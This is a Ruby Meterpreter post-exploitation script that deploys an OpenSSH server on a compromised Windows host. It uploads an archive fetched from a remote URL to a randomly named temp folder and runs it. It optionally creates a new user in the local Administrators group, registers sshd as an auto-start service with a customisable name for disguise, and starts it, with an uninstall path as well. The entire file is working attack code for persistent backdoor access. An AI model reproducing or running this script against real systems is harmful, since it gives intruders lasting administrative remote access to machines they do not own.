#
# meterpreter-script to deploy + run OpenSSH
# on the target machine
#
# written by Oliver "illegalguy" Kleinecke
# v.1.0 2010-04-25
#

require 'net/http'
meter_type = client.platform
#
# Options
#

@@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false, "This help menu"],
  "-f"  => [ true,  "The filename of the OpenSSH-SFX to deploy. (Default is to auto-download from meterpreter.illegalguy.hostzi.com"],
  "-U"  => [ true, "Download OpenSSH-SFX from given URL"],
  "-u"  => [ true, "Add windows-user (autoadded to local administrators"],
  "-p"  => [ true, "Password for the new user"],
  "-r"  => [ false, "Uninstall OpenSSH + delete added user (ATTENTION: will only uninstall OpenSSH-installations that were deployed by this script!!)"],
  "-I"  => [ true, "Install OpenSSH to the given directory"],
  "-F"  => [ false, "Force overwriting of registry-values"],
  "-S"  => [ true, "Set custom service description"],
  "-N"  => [ true, "Set custom service name"],
  "-m"  => [ true, "Do not start the OpenSSH-service after installation"],
  "-t"  => [ true, "Set start-type of the service to manual (Default: auto)"]
  )

def usage
  print_line("OpenSSH-server deploy+run script")
  print_line("This script will deploy OpenSSH + run the SSH-server as a service")
  print_line(@@exec_opts.usage)
  raise Rex::Script::Completed
end

def createkey(key)
  root_key, base_key = client.sys.registry.splitkey(key)
  open_key = client.sys.registry.create_key(root_key, base_key)
end

def deletekey(key)
  root_key, base_key = client.sys.registry.splitkey(key)
  rtrncode = client.sys.registry.delete_key(root_key, base_key)
  return rtrncode
end

def setval(key, value, data, type = "REG_SZ")
  root_key, base_key = client.sys.registry.splitkey(key)
  open_key = client.sys.registry.create_key(root_key, base_key, KEY_WRITE)
  open_key.set_value(value, client.sys.registry.type2str(type), data)
end

def queryval(key, value)
  root_key, base_key = client.sys.registry.splitkey(key)
  hkey = client.sys.registry.open_key(root_key, base_key)
  valdata = hkey.query_value(value)
  return valdata.data
end

# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
  print_error("#{meter} version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end

#
# Default values
#
extractfilename = File.join(Msf::Config.data_directory, "/openssh-extract.sfx")
manual = false
username = "none"
password = nil
downloadurl = 'http://updates.metasploit.com/data/win32-ssh/openssh.sfx'
uninstall = nil
installpath = nil
license = 'Please go to https://olex.openlogic.com/licenses/openssh-license for license information!'
extractexe = nil
warning = 'Script stopped. There are openssh/cygwin-registrykeys on the target host. Please uninstall the service(s) first, or use -F!'
forced = nil
servicename = "OpenSSHd"
servicedesc = "OpenSSH-Server"
noauto = false
dirname = nil
type = "auto"


#
# Option parsing
#
@@exec_opts.parse(args) { |opt, idx, val|
  case opt

  when "-h"
    usage

  when "-f"
    if !val
      print_error("-f requires the SFX-filename as argument !")
      usage
    end
    extractfilename = val
    if not ::File.exists?(extractfilename)
      print_error("OpenSSH-SFX not found/accessible!")
      usage
    end
    manual = true

  when "-U"
    if !val
      print_error("-U requires the download-URL for the OpenSSH-SFX as argument !")
      usage
    end
    downloadurl = val

  when "-p"
    if !val
      print_error("-p requires the password (for the windows-user to add) as argument !")
      usage
    end
    if val.length > 14
      print_error("Password must not be longer than 14chars due to \"net user .. /ADD\" restrictions, sorry !")
      usage
    end
    password = val

  when "-u"
    if !val
      print_error("-u requires the username (for the windows-user to add) as argument!")
      usage
    end
    username = val

  when "-r"
    uninstall = true

  when "-I"
    if !val
      print_error("-I requires a directory-name to use as installpath")
      usage
    end
    dirname = val

  when "-F"
    forced = true

  when "-S"
    if !val
      print_error("-S requires s custom string to use as the service-description")
      usage
    end
    servicedesc = val

  when "-N"
    if !val
      print_error("-N requires a custom string to use as service-name")
      usage
    end
    servicename = val

  when "-m"
    noauto = true

  when "-t"
    type = manual

  else
    print_error("Unknown option: #{opt}")
    usage
  end
}

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i

#
# Uninstall if selected
#
if uninstall
  username = nil
  servicename = nil
  begin
    dirname = queryval("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\mounts\ v2\\/", "native")
  rescue
    print_status("Could not find any sshd installed by this script. Please remove manually!")
    deletekey("HKLM\\Software\\Cygnus\ Solutions")
    raise Rex::Script::Completed
  end
  uninstallfile = "#{dirname}\\etc\\uninst.bak"
  uf = client.fs.file.new(uninstallfile, "rb")
  while not uf.eof?
    linesarray = uf.read.split("\r\n")
    username = linesarray[0]
    servicename = linesarray[1]
  end
  uf.close
  # stop sshd-service, delete it, delete user + files afterwards
  print_status("Stopping the #{servicename}-service....")
  client.sys.process.execute("cmd.exe", "/c sc stop #{servicename}")
  sleep 2
  print_status("#{servicename} has been stopped.")
  print_status("Deleting the #{servicename}-service....")
  client.sys.process.execute("cmd.exe", "/c sc delete #{servicename}")
  sleep 1
  print_status("#{servicename} has been deleted.")
  unless username.strip == "none"
    print_status("Deleting user #{username}......")
    client.sys.process.execute("cmd.exe", "/c net user #{username} /DELETE")
    print_status("User #{username} has been deleted")
  end
  print_status("Deleting the directory #{dirname}....")
  client.sys.process.execute("cmd.exe", "/c rmdir /S /Q #{dirname}")
  print_status("#{dirname} has been deleted.")
  print_status("Deleting regkeys ....")
  deletekey("HKLM\\Software\\Cygnus\ Solutions")
  print_status("Registry-keys have been deleted .")
  print_status("Uninstall completed!")
  raise Rex::Script::Completed
end

#
# Check for OpenSSH/Cygwin - Regkeys first and bail out if they exist
#
root_key, base_key = client.sys.registry.splitkey("HKLM\\Software\\Cygnus\ Solutions")
open_key = client.sys.registry.open_key(root_key, base_key)
keys = open_key.enum_key
if ( keys.length > 0)
  if not forced
    print_error(warning)
    raise Rex::Script::Completed
  end
end

#
# If file doesn`t exist and file was not manually specified : auto-download
#

if manual == false
  if not ::File.exists?(extractfilename)
    print_status("openssh-extract.sfx could not be found. Downloading it now...")
    print_status(license)
    extractexe = Net::HTTP.get URI.parse(downloadurl)
    open(extractfilename, "wb") { |fd| fd.write(extractexe) }
    print_status("openssh-extract.sfx has been downloaded to #{extractfilename} (local machine). Please remove manually after use or keep for reuse.")
    downloaded = true
  end
end

#
# Generate sshd-dir + upload file to client
#
if dirname == nil
  dirname = client.fs.file.expand_path("%TEMP%") + '\\' + "#{rand(36 ** 8).to_s(36).rjust(8,"0")}"
  print_status("Creating directory #{dirname}.....")
  client.fs.dir.mkdir(dirname)
else
  if  !::File.exists?(dirname) && !::File.directory?(dirname)
    print_status("Creating directory #{dirname}.....")
    client.fs.dir.mkdir(dirname)
  end
end
fileontrgt = "#{dirname}\\#{rand(36 ** 8).to_s(36).rjust(8,"0")}.exe"
print_status("Uploading #{extractfilename} to #{fileontrgt}....")
client.fs.file.upload_file(fileontrgt, extractfilename)
print_status("#{extractfilename} successfully uploaded to #{fileontrgt}!")


# Get required infos about the target-system
clientenv = Hash.new
envtxtname = "#{dirname}\\#{rand(36 ** 8).to_s(36).rjust(8,"0")}.txt"
client.sys.process.execute("cmd.exe", "/c set > #{envtxtname}")

fd = client.fs.file.new(envtxtname, "rb")
while not fd.eof?
  linesarray = fd.read.split("\r\n")
  linesarray.each { |line|
    currentline = line.split('=')
    envvarname = currentline[0]
    envvarvalue = currentline[1]
    clientenv[envvarname] = envvarvalue
  }
end
fd.close

# Do not continue if client-os is not valid

unless clientenv["OS"] == 'Windows_NT'
  print_error("This script will run on Windows-NT based OS only!")
  raise Rex::Script::Completed
end


# Extract the files

print_status("Extracting the files ...")
client.sys.process.execute(fileontrgt)
sleep 3
print_status("Files extracted .. ")

#
# Import required registry keys
#
homebase = clientenv["ALLUSERSPROFILE"].slice(0,clientenv["ALLUSERSPROFILE"].rindex('\\'))

createkey("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\mounts\ v2")
createkey("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\mounts\ v2\\/")
setval("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\mounts\ v2\\/", "native", dirname)
setval("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\mounts\ v2\\/", "flags", 10, "REG_DWORD")
createkey("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\mounts\ v2\\/home")
setval("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\mounts\ v2\\/home", "native", homebase)
setval("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\mounts\ v2\\/home", "flags", 10, "REG_DWORD")
createkey("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\mounts\ v2\\/usr/bin")
setval("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\mounts\ v2\\/usr/bin", "native", "#{dirname}/bin")
setval("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\mounts\ v2\\/usr/bin", "flags", 10, "REG_DWORD")
createkey("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\Program Options")

#
# Provide ACL for System User
#
client.sys.process.execute("cacls.exe", "#{dirname} /E /T /G SYSTEM:F")

#
# Add windows-user if requested
#
unless username == "none"
  if password == nil
    print_error("You need to provide a nonempty password for the user with the \"-p\"-parameter!")
    usage
  end

  #Get localized name for windows-admin-grp
  admingrpname = nil
  client.sys.process.execute("cmd.exe", "/c #{dirname}\\bin\\mkgroup.exe -l > #{dirname}\\groupnames.txt")
  sleep 1
  fd = client.fs.file.new("#{dirname}\\groupnames.txt", "rb")
  while not fd.eof?
    linesarray = fd.read.split("\n")
    linesarray.each { |line|
      if line[0..4] =~ /[aA]dmin/
        admingrpname = line.slice!(/[aA]dmin[a-z]+/)
      end
    }
  end
  fd.close
  sleep 2
  client.fs.file.rm("#{dirname}\\groupnames.txt")
  print_line("Adding user #{username}....")
  client.sys.process.execute("cmd.exe", "/c net user #{username} #{password} /ADD /HOMEDIR:#{dirname}")
  print_line("Add user #{username} to #{admingrpname}")
  client.sys.process.execute("cmd.exe", "/c net localgroup #{admingrpname} #{username} /ADD")
end

#
# Generate /etc/passwd + /etc/group files
#
print_status("Generating /etc/passwd + /etc/group files....")
client.sys.process.execute("cmd.exe", "/c #{dirname}\\bin\\mkpasswd.exe -l > #{dirname}\\etc\\passwd")
client.sys.process.execute("cmd.exe", "/c #{dirname}\\bin\\mkgroup.exe -l > #{dirname}\\etc\\group")

#
# Generate SSH-keypairs
#
print_status("Generating SSH-keys .....")
client.sys.process.execute("cmd.exe", "/c #{dirname}\\bin\\ssh-keygen.exe -t dsa -f /etc/ssh_host_dsa_key -N \"\"")
sleep 1
client.sys.process.execute("cmd.exe", "/c #{dirname}\\bin\\ssh-keygen.exe -t rsa1 -f /etc/ssh_host_key -N \"\"")
sleep 1
client.sys.process.execute("cmd.exe", "/c #{dirname}\\bin\\ssh-keygen.exe -t rsa -f /etc/ssh_host_rsa_key -N \"\"")

#
# Add OpenSSH - Service
#
print_status("Adding OpenSSHd-Service.......")
if type == manual
  client.sys.process.execute("cmd.exe", "/c #{dirname}\\bin\\cygrunsrv.exe --install #{servicename} --path /usr/sbin/sshd --args \"-D\" --dep \"Tcpip\" --stderr \"/var/log/opensshd.log\" --env \"CYGWIN=binmode ntsec tty\" --type manual --disp \"#{servicedesc}\"")
else
  client.sys.process.execute("cmd.exe", "/c #{dirname}\\bin\\cygrunsrv.exe --install #{servicename} --path /usr/sbin/sshd --args \"-D\" --dep \"Tcpip\" --stderr \"/var/log/opensshd.log\" --env \"CYGWIN=binmode ntsec tty\" --disp \"#{servicedesc}\"")
end
print_status("Service successfully installed!")
sleep 2

#
# Save "settings" to txtfile, to be able to del correct user etc afterwards
#
uninstallfile = "#{dirname}\\etc\\uninst.bak"
uf = client.fs.file.new(uninstallfile, "w")
uf.write "#{username} \r\n"
uf.write "#{servicename} \r\n"
uf.close


# Run OpenSSH-service unless noauto was specified
unless noauto
  print_status("Starting OpenSSH-Service....")
  client.sys.process.execute("cmd.exe", "/c net start #{servicename}")
  sleep 1
  print_status("OpenSSHd has been started!")
end

# Display OpenSSH-Hostkey, so that user may pass this to sshclient-script directly
